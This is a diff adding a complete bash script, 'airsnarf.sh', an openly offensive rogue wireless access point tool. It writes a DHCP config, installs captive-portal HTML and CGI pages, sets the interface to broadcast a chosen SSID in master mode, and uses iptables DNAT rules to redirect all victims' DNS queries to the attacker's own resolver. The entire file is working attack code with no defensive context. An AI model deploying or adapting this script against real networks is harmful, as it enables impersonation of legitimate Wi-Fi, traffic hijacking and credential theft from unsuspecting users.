@@ -1,0 +1,64 @@
+#!/bin/bash
+# airsnarf.sh
+# A rogue AP setup utility.
+
+echo "Airsnarf - A rogue AP setup utility."
+echo "0.2"
+echo "The Shmoo Group"
+echo "------------------------------------"
+# here are some variables you may want to edit
+WWW_ROOT="/srv/http/"
+CGI_ROOT="/srv/http/cgi-bin"
+LOCAL_CFG="./cfg"
+
+# specify another config dir with a command line arg if you want
+if [ $1 ]
+then
+LOCAL_CFG="$1"
+fi
+
+source $LOCAL_CFG/airsnarf.cfg
+
+# create the dhcpd.conf
+echo -n "Creating dhcpd.conf..."
+sed s/AIRSNARF/$ROGUE_NET/g ./etc/dhcpd.src > /etc/dhcpd.conf
+echo "Done."
+
+# copy over the www stuff
+echo -n "Building the captive portal..."
+cp $LOCAL_CFG/html/* $WWW_ROOT
+cp $LOCAL_CFG/cgi-bin/* $CGI_ROOT
+chmod +x $CGI_ROOT/*
+echo "Done."
+
+# set our wireless parameters
+echo -n "Setting the wireless parameters..."
+iwconfig $ROGUE_INTERFACE essid $ROGUE_SSID mode master
+echo "Done."
+
+# set our ip and default route
+echo -n "Setting the ip address and default route..."
+ifconfig $ROGUE_INTERFACE $ROGUE_GW
+route add -net 0.0.0.0 gw $ROGUE_GW
+echo "Done."
+
+# restart some services
+/etc/rc.d/dhcpd restart
+/etc/rc.d/httpd restart
+
+# set up the firewall to redirect
+echo -n "Setting up firewall to redirect DNS..."
+echo 1 > /proc/sys/net/ipv4/ip_forward
+modprobe iptable_nat
+iptables -F -t nat
+iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \
+--to $ROGUE_GW
+# dammit, I swear this used to work with just an OUTPUT rule...
+iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT \
+--to $ROGUE_GW
+echo "Done."
+
+# start the local dns resolver
+echo "Starting local DNS resolver..."
+chmod +x ./bin/airsnarf_dns.pl
+./bin/airsnarf_dns.pl
